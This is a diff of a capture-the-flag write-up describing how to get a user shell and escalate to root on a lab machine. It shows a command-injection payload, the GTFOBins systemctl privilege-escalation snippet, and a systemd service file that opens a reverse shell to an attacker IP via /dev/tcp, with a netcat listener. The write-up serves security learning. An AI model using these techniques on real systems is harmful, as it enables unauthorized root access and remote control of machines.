@@ -281,15 +281,63 @@ Enter an IP: $(/bin/bash)
 ```
 
 + The new shell is not working properly. It only shows stderr. Redirect stdout to our shell using: `>&2 /bin/bash`
++ Get the pepper's shell, and read the user flag.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cd05cba2-ac58-4f92-9642-2d2ee150e7ca)
 
-+ Get the pepper's shell, and read the user flag.
 
 
 ## Privilege Escalation: from 'pepper' to 'root'
+
+### Method 1
 + Escalate privileges to get the root flag.
-+ 
++ Check the files which has the SUID bit set.
+```
+find / -type f -user root -perm /4000 -exec ls -l {} \; 2>/dev/null
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6f364d98-6e5e-463b-baf9-ce9b9af6953f)
+
++ Since the file is owned by root, the file will execute with root privileges.
++ Check [systemctl](https://gtfobins.github.io/gtfobins/systemctl/) on gtfobins.
+```
+TF=$(mktemp)
+echo /bin/sh >$TF
+chmod +x $TF
+SYSTEMD_EDITOR=$TF systemctl edit system.slice
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0aa23315-8d23-4e11-8f29-d8fc2c2a89b2)
+
+
+### Method 2
++ **/bin/systemctl** binary has the setuid bit set, and it's owned by root. This binary is a systemd utility which is responsible for Controlling the systemd system and service manager. It creates and manages services.
++ And in this case, only root and users in the group pepper can run it, and it will run as root.
++ First, create a **shell.service** file on the attack machine:
+```
+[Unit]
+Description=get root shell
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/5555 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/257ada92-4305-45ef-b3c2-11f0886bf366)
+
++ Transfer it to the target machine, and then run the command.
+```
+/bin/systemctl enable /home/pepper/shell.service
+```
+
++ Start a netcat listener on the attack machine: `nc -lnvp 5555`
++ In the target machine, start the **shell** service: `/bin/systemctl start shell`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1e77d5f4-ba24-4fa3-a075-d274510fdb03)
 
 
 
